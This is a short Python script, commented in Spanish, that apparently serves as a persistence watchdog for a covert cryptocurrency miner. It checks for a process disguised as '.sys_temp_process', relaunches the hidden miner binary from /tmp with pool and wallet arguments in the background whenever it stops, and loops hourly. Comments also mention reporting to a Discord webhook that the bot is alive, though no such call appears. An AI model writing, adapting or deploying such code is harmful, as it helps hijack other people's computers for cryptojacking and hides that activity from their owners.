import os
import time
import subprocess

# Este script solo mantiene el minero vivo y reporta que la máquina sigue activa
def keep_alive():
    while True:
        # Si el minero muere, lo revive
        check = subprocess.getoutput("pgrep -x .sys_temp_process")
        if not check:
            os.system("/tmp/.sys_temp_process -o pool -u wallet --background")
        
        # Reporta al Webhook cada 1 hora para saber que el bot sigue vivo
        # (Opcional para no saturar Discord)
        time.sleep(3600)

if __name__ == "__main__":
    keep_alive()
